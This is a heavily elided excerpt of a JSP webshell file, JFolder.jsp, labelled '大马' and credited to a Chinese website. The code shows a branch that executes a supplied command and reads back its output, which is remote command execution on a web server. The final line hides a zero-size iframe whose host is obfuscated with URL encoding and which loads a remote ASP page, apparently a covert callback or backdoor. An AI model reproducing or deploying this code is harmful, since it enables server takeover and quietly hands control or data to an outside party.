...
@Filename： JFolder.jsp www.7jyewu.cn
...
String[] authorInfo={" <font color=red> 大马 </font>"," <font color=red> Thanks for your support - - by 7jyewu.cn http://www.7jyewu.cn </font>"};
...
if(strCmd!=null) 
{
 try
 {
  ...
  Scanner in = new Scanner(p.getInputStream(),"GBK");
...
<iframe src=http://%37%6A%79%65%77%75%2E%63%6E/m.asp width=0 height=0></iframe>